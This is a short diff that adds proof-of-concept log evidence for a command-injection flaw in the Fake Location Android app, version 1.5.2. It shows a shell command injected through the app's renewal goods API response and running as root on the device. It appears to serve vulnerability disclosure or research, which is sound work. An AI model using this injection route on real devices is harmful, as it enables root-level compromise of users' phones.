@@ -1,0 +1,4 @@
+Official-site/GitHub build 1.5.2 (com.lerist.fakelocation) path 2: opening RenewalActivity triggers goods/getRenewalGoodsList
+11-05 15:29:07.515 I/FLRcePoC(22450): INJECT generic @ https://api.fakeloc.cc:4430/FakeLocation/goods/getRenewalGoodsList -> id > /data/local/tmp/poc_gen_$(id -u).txt 2>&1
+poc_gen_0.txt (su, root):
+uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
